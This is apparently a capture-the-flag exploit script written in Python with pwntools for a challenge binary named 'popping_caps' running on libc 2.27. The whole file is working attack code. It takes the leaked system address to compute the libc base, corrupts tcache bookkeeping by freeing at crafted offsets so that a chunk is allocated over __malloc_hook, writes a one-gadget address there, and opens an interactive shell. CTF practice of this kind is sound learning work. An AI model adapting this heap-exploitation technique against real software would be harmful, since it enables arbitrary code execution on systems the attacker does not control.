import pwn as p

target = p.process('./popping_caps', env={'LD_PRELOAD': './libc-2.27.so'})
# p.gdb.attach(target)
# p.gdb.attach(target, gdbscript='b *bye')

libc = p.ELF('./libc-2.27.so')


def b(s: str) -> bytes:
    return s.encode('utf8')


def s(b: bytes) -> str:
    return b.decode('utf8')


def prints(b: bytes):
    print(s(b))


def malloc(size: int) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'1')
    prints(target.recvuntil(b'How many:'))
    target.sendline(b(str(size)))


def free(delta: int) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'2')
    prints(target.recvuntil(b'Whats in a free:'))
    target.sendline(b(str(delta)))


def write(payload: bytes) -> None:
    prints(target.recvuntil(b'Your choice:'))
    target.sendline(b'3')
    prints(target.recvuntil(b'Read me in:'))
    target.send(payload)


first_line = target.recvline().strip().replace(b'Here is system ', b'')
system_leak = int(first_line, 16)
print('system leak:', hex(system_leak))

libc_base = system_leak - libc.symbols['system']
print('libc_base:', hex(libc_base))

malloc_hook = libc_base + libc.symbols['__malloc_hook']
print('malloc_hook:', hex(malloc_hook))

# make a counter appear at the right place
malloc(0x3a0)
free(0x0)

# free the fake chunk so we can allocated it back
free(-0x210)

# allocate the chunk within bookkeeping section
malloc(0xf0)

# write address of next target
write(p.p64(malloc_hook))

# allocate the fake chunk on malloc_hook
malloc(0x10)

# write gadget at malloc_hook
onegadget = libc_base + 0x10a38c
write(p.p64(onegadget))

target.interactive()
